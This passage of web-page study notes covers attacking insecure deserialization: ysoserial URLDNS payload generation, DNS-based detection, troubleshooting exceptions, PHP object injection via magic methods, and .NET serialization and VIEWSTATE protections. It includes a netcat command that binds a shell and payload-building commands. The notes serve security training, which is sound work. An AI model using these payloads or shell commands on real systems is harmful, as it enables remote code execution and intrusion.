integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="140364fb-eb6f-4b0d-86f0-527dd17b8fcf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://somethingnonexistent.com &gt; DeserLab/DeserLab-v1.0/p.bin
</code></pre><blockquote id="bdf684e9-dd44-4270-82ae-2fab211355e2" class="">If u have Burp Suite Pro, u can use the Collaborator Client in order to generate and catch DNS requests</blockquote><p id="95c84aa3-8ff2-4596-945d-c4a72da46a36" class="">DNSChief will be used as a simple DNS proxy. You can clone it from its GitHub repository:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f9562f2d-6118-4fc2-9551-ec07aa785e77" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/iphelix/dnschef
</code></pre><p id="a49a9606-0da3-4fe7-ba2f-aa199473897a" class="">Add to the /etc/resolv.conf</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="103e263c-c4d0-4da9-8739-e13becf51db3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nameserver 127.0.0.1
</code></pre><p id="6caf9224-a03f-4119-a5c0-58b7f624f37a" class="">Start the DNSChief and verify if its working properly by trying to ping a non-existent domain:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa215ba1-0ff4-499b-8f4d-f14faaea62ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping oahsdhuasdo.com
</code></pre><ul id="dd30990a-50d3-40c8-b529-e3dc099d55c3" class="bulleted-list"><li style="list-style-type:disc">Now we can execute the payload (p.bin) and see if the lookup is performed</li></ul><ul id="1230e017-0ddf-4167-bb66-0b239ce08b40" class="bulleted-list"><li style="list-style-type:disc">URLDNS payloads can be used to detect deserialization issues before you can try to attack them with full-RCE payloads</li></ul><ul id="cb6947a7-907f-4df9-ab4a-1876a6883328" class="bulleted-list"><li style="list-style-type:disc">Ysoserial payloads that results in code execution rely on similarly nested objects, however, they can be a lot more complicated and involve several objects and their properties</li></ul><h3 id="d534a989-2311-41b5-87f0-3911dea596c7" class=""><strong>Troubleshooting Ysoserial</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#troubleshooting-ysoserial"></a></strong></h3><p id="ddfd7706-cbc9-4a72-9166-15311fa3c476" class="">In order to be able to confirm whether the application is secure or not, you shoudl be familiar with the exception types that can be thrown during the attacking process.</p><ul id="51c9b5c6-755f-4224-8d6d-1da0c32ae347" class="bulleted-list"><li style="list-style-type:disc">Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface</li></ul><ul id="6ad8c9ac-618c-48a2-ba73-3ed12bad84a8" class="bulleted-list"><li style="list-style-type:disc">When attacking, u should be aware of where the exception comes from. Ysoserial itself prints verbose stack traces when used incorrectly</li></ul><p id="bade40b1-8295-4709-8363-c0873ed20b27" class="">When reading the stack trace, if u encounter a <strong>ClassNotFoundException</strong>, its likely that the target application does not utilize the gadget library used by the usoserial payload. You can then try to use a different payload that targets another library</p><ul id="05135ed8-c2fa-4f43-a78a-586a88460ceb" class="bulleted-list"><li style="list-style-type:disc">If you encountered <strong>java.io.IOException</strong> with the message <em>Cannot run program</em>, this is a good sign because your payload worked. However, the app u wanted to call is unavailable For some reason (example: it doesnt exist)</li></ul><p id="aab813bc-5ffd-4c73-9a27-c0477bf8df61" class="">When telling ysoserial to create an RCE-related payload, you should be aware of its limitations:</p><ul id="bdc6525e-bb95-4670-a576-1ced682d1c82" class="bulleted-list"><li style="list-style-type:disc">Output redirections and pipes are not supported</li></ul><ul id="c22b2ef3-2ceb-49e1-b084-bad3a95e55c9" class="bulleted-list"><li style="list-style-type:disc">Parameters to the command cannot contain spaces; so, while:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fb916845-03f7-49a6-920c-934136603b63" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lp 4444 -e /bin;sh# is ok
python -c import socket;... # will not work because the parameter (import socket) to Python contains a space
</code></pre></li></ul><h2 id="05a4150d-0856-461d-abd1-7b45a9c4d69a" class=""><strong>Spotting Java Serialized Objects</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#spotting-java-serialized-objects"></a></strong></h2><p id="7bdd9504-f48f-4ae6-87b1-26ac738d49e3" class="">Pay attention to binary data, especially if its starts with:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8795cdc1-cb75-430d-b61e-74edae53b690" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&quot;aced0005&quot; hex
&quot;rO0aB&quot;    base64
looks like a list of java classes (eg &quot;org.apache.somethig&quot;, &quot;java.lang.String&quot;)
# Presence of such data may indicate that the target application is deserializing custom data.
</code></pre><h3 id="e2865b35-61eb-487d-93b7-81509bde3230" class=""><strong>Recommended Reading</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#recommended-reading"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c64a4b9-9350-4d97-a889-109cbf395247" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- https://github.com/Coalfire-Research/java-deserialization-exploits
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
- https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
</code></pre><h2 id="d1a3c80a-1d60-4ae0-b3e7-ce7c3f336c0f" class=""><strong>Serialization in PHP</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#serialization-in-php"></a></strong></h2><p id="b78b63cf-274c-4902-8d8c-d89a8cb956b1" class="">AKA PHP Object Injection</p><ul id="148ca72e-1d28-4147-ae09-705eddc9db20" class="bulleted-list"><li style="list-style-type:disc">PHP uses serialize() and unserialize() functions to store, transfer and transform whole objects.</li></ul><ul id="30c498ac-769d-4f16-ad80-69da380450ed" class="bulleted-list"><li style="list-style-type:disc">Unlike Java, PHP Serialization is in non-binary format, looks similar to a JSON array and its human-readable.</li></ul><p id="eb9236ae-3b7b-4a13-96bd-ffbce89f21f6" class="">looks like:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d5b86f56-d0dd-4c0f-ab1f-002f5ad7e037" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">0:6:6&quot;Abcdef&quot;:1:1{s:9:&quot;Something&quot;;s:6:&quot;Active&quot;;}
</code></pre><p id="fdb985e0-cade-4c8a-bcd5-e986f6e4322b" class="">For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="174605d2-62ea-4d63-84ca-df13a61380b1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Booleans are serialized as &#x27;b:&lt;i&gt;;&#x27; # where i is 0 or 1 (true/false)

Strings are serialized as &#x27;s:&lt;i&gt;:&quot;&lt;s&gt;&quot;;&#x27; # where is is the string length and s is the string itself

Arrays are serialized as &#x27;a:&lt;i&gt;:{&lt;elements&gt;}&#x27; # where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, &#x27;&lt;key&gt;&lt;value&gt;&#x27;

Objects (classes) are serialized as &#x27;O:&lt;i&gt;:&quot;&lt;s&gt;&quot;:&lt;i&gt;:{&lt;properties&gt;}&#x27; # where the first &lt;i&gt; is an integer representing the string length of &lt;s&gt; and &lt;s&gt; is the fully qualified class name
  ⇒ the second &lt;i&gt; is an integer representing the number of object properties, and &lt;properties&gt; are zero or more serialized name-value pairs
  ⇒ In the &lt;name&gt;&lt;value&gt; pair, &lt;name&gt; is a serialized string representing the property name, and &lt;value&gt; is any value that is serializable
  ⇒ Also, &lt;name&gt; is represented as &#x27;s:&lt;i&gt;:&quot;&lt;s&gt;&quot;;&#x27; where &lt;i&gt; is an integer representing the string length of &lt;s&gt;

The visibility of properties influences the value of &lt;s&gt; in the following ways:
  ⇒ With public properties, &lt;s&gt; is the simple name of the property
  ⇒ With protected properties, &lt;s&gt; is the simple name of the property, prepended with \0*\0 - an asterix enclosed in two NULL bytes (0x00)
  ⇒ With private properties, &lt;s&gt; is the simple name of the property, prepended with \0&lt;s&gt;\0 - &lt;s&gt; and enclosed in two NULL bytes, where &lt;s&gt; is the fully qualified class name
</code></pre><h3 id="4a3314ef-9b06-4e52-b36b-00645235899c" class=""><strong>Moreover PHP serialized data format</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#moreover-php-serialized-data-format"></a></strong></h3><p id="c1b82666-a98b-4e0d-8729-ba38921ef57e" class="">→ http://www.phpinternalsbook.com/php5/classes_objects/serialization.html</p><p id="fe7613cf-bf4c-4126-a9de-c309b090aa70" class="">→ https://www.geeksforgeeks.org/php-serializing-data/</p><blockquote id="23de78b8-ca55-4098-8bae-c2ecb28b91ea" class="">You might often encounter the PHP serialized data to be Base64 encoded For transportation purposes. Never leave any Base64 data uninspected.</blockquote><h3 id="b59866ca-014e-4e29-886c-c23ad82117d6" class=""><strong>Magic Methods</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#magic-methods"></a></strong></h3><p id="6a0ac970-3195-4388-afff-1a067cadea77" class="">They are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, For example:, <strong>__construct()</strong></p><p id="be4c8757-210c-4d14-a95a-ea46770acfd6" class="">The triggers For the PHP classes are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="679f8872-a579-42b6-a639-172515194294" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">__construct() is loaded upon creating a new instance of a class
__destruct() is loaded when no more references of a current class are present in memory
__wakeUp() is loaded upon deserializing an object
</code></pre><p id="ec7e9e50-bd8b-4298-ae54-dd30fb91728b" class="">Moreover</p><p id="7e315089-8c5c-4e55-8d4c-b5658bba949f" class="">→ https://www.php.net/manual/en/language.oop5.magic.php</p><figure id="6faa0e1f-8d3e-4dd1-bcac-cb0a4ee80c71" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/25.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/25.png"/></a></figure><figure id="30704ed1-6022-4ac1-a280-bdab9ed9283a" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/26.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/26.png"/></a></figure><p id="f0f1747e-926b-49d5-8f2b-e2dd6eb6abbe" class="">First lets create a history.lol file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d8835a5-c0ee-47bb-b5cc-8845c75796d9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">touch history.lol
</code></pre><ul id="4c2ce990-bedb-48e8-98a4-fbf26b920769" class="bulleted-list"><li style="list-style-type:disc">Lets change the $serialize variable from <strong>history.log</strong> to <strong>history.lol</strong>. As the filename length is the same, we do not need to change the string length information in the serialized data.</li></ul><blockquote id="9347ec42-dc4f-483e-83bd-7a42b04ffe0a" class="">We can observe the destructor function to be run on the history.lol file, which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.</blockquote><p id="6e9da5fc-3e08-4426-a551-9b759a763b5a" class="">In this example, serialized data was passed in a variable to simplify the example</p><p id="ecf1cbf5-2ecb-43dd-a5f7-f4a51246278a" class="">in the real world, such data often comes from other sources, For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4862ebc4-a974-4a00-8b88-e42d5467a4ec" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTP requests parameters
</code></pre><p id="32a06349-c341-4f4e-a533-0b007ef03ab2" class="">Exploitation of such vuln was possible because:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7150171-ec0b-4830-88a1-21a3ff69c2aa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- We had access to the source code, so we knew what the script exactly does
- We had access to the original serialized payload, so we knew what to alter in it
- The vuln function was implemented in the default destructor, so the data was used after the deserialization. There could be a case when data is unserialized but not used in an insecure manner.
</code></pre><p id="46098cf1-b2da-4e94-b4cc-6d8249b25c9d" class="">Unserialization logic added to the code:</p><figure id="71755e88-2dc9-4d82-8a9c-8d27773984ff" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/27.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/27.png"/></a></figure><p id="1678c2d7-38e9-4876-9751-4f1d2e0ade1d" class="">Upon deserialization, the class magic methods will be run so that the file will be removed in the destructor function:</p><figure id="f57177bd-d2ce-480a-b508-70b5267c2ce6" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/28.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/28.png"/></a></figure><h2 id="3e103360-3a03-4649-ba81-4819a12389eb" class=""><strong>.NET Serialization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#net-serialization"></a></strong></h2><ul id="6317b1b9-f8c2-413b-8651-3acf305f1b60" class="bulleted-list"><li style="list-style-type:disc">It uses a few different mechanisms For serialization and de-serialization of data. Data serialized using one of these mechanisms must be de-serialized using the same one.</li></ul><h3 id="284360c1-cb0e-4ead-ae2a-3ef9bcb6f2b4" class=""><strong>.NET Serialization Types</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#net-serialization-types"></a></strong></h3><p id="40f56299-4fbe-443f-93a8-c0d85c410af0" class="">Saving the states of objects using serialization in .NET can be done using various methods:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="308663f5-d8a5-45f1-bb24-2cec8e1c26e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- BinaryFormatter
- DataContractSerializer
- NetDataContractSerializer
- XML Serialization
</code></pre><p id="02cb0975-3add-487e-acd3-4182f5a3140d" class="">BinaryFormatter serialized data to a binary file, and data serialized using XML Serialized is in human-readable, XML format</p><ul id="651de96e-03ee-42a1-afd9-7f7364743050" class="bulleted-list"><li style="list-style-type:disc">Usage of them is situational and connected to .NET internals.</li></ul><ul id="d8af8ee1-77ec-488d-bbb2-e52f135565c2" class="bulleted-list"><li style="list-style-type:disc">We are going to see the use of Ysoserial.net, which is similar to the java one.</li></ul><p id="57f4c477-18ed-41ef-adfa-1766ab1382a5" class="">BinaryFormmater example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82edfad5-82dd-409f-8e3a-b5ebab43cf8b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The app serialized a string and writes the output to a file
- The file is in binary format, as the name implies
</code></pre><p id="fab799d2-5c86-45f7-98af-6f308d841148" class="">After running the application we can inspect the serialized data in the file. Indeed, its in binary format.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12b71c74-c137-4dc6-b960-57b963e5c98b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">type data.dat
</code></pre><ul id="ecafb47c-322d-4cc9-802d-4324789e6e26" class="bulleted-list"><li style="list-style-type:disc">You can expect serialized .NET data encountered in web apps to be Base64 encoded in order to conveniently send non-ASCII characters in HTTP requests and responses.</li></ul><h3 id="2d58a307-90a1-417e-9e88-ae07ae4e2055" class=""><strong>Spotting .NET Serialized Data</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#spotting-net-serialized-data"></a></strong></h3><p id="b3bf5cf1-315d-4d29-8eff-e767dac90c8c" class="">A common, but not the only place where serialized data can be foudn is when data is sent in a VIEWSTATE parameter, or .NET remoting services.</p><ul id="976dc112-c691-4a5f-98d7-98bcfbdf3e59" class="bulleted-list"><li style="list-style-type:disc">.NET remoting services can be considered part of the web application world but they are also part of the infrastructure</li></ul><ul id="e96fe417-e15f-445d-8d2e-9303eefa184b" class="bulleted-list"><li style="list-style-type:disc">.NET remoting is the mechanics that allow sending pure .NET objects via TCP; however, depending on the application infrastructure, web applications may provide a layer of transport to supply data destined to a .NET remoting endpoint.</li></ul><p id="4c84ed2d-579f-44b6-bdc1-de1ace240eba" class="">Examples of exploiting .NET remoting via HTTP: → https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/</p><p id="a9d1a54f-dd33-44a4-b3cc-ec7fa590ca45" class="">→ https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/</p><h3 id="5f1b59a1-a9e6-4381-a7e5-8a5df727667f" class=""><strong>VIEWSTATE</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#viewstate"></a></strong></h3><p id="c9091b3a-4e68-402e-a8f6-5e93a636f29a" class="">Its a web parameter that is used in the majority of .NET web apps in order to persist the state of the current web page</p><p id="dfb9a941-08dc-43fa-9b83-61609f3cc278" class="">Viewstate is the state of the page and all its controls. Its automatically maintened across the web app by the ASP.NET framework</p><ul id="3243cd6b-40fe-4421-bc9c-a4212f0470b2" class="bulleted-list"><li style="list-style-type:disc">When a page its sent back to the client, the changes in the properties of the page and its controls are determined, and then, they are stored in the value of a hidden input field name __VIEWSTATE</li></ul><ul id="f02fe4ba-77b4-4d52-be8a-095fc4fb3bcb" class="bulleted-list"><li style="list-style-type:disc">With every other POST request, the __VIEWSTATE field is sent to the server together with other parameters</li></ul><h3 id="a9abf872-ccfa-4a8d-8cc7-3c1e79b32a33" class=""><strong>Countermeasures against VIEWSTATE tampering</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#countermeasures-against-viewstate-tampering"></a></strong></h3><p id="17c07333-e4dd-46d7-94b1-e173ade1b232" class="">MAC Enabled option - the viewstate is signed with a cryptographic key known only by the server-side. Its configured by the following setting/option:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82353912-f7d3-4d53-8d4e-c6781d0e3488" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;page enableViewStateMac=&quot;true&quot; /&gt;
</code></pre><ul id="cba0cb29-6554-4dde-9feb-f460d78e194e" class="bulleted-list"><li style="list-style-type:disc">In web.config or <strong>setting MAC validation in IIS manager</strong>, the latest .NET framework uses MAC validation by default</li></ul><ul id="ce68efd9-705f-4f99-9d7f-6820b5db9ef6" class="bulleted-list"><li style="list-style-type:disc">if the key is hardcoded, it might be leaked as a result of file read vulnerabilities like XXE, File inclusion or similar</li></ul><p id="2f9852de-e8bc-4d85-a284-154f0f481f28" class="">Its possible to encrypt the viewstate by configuring the web config:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre 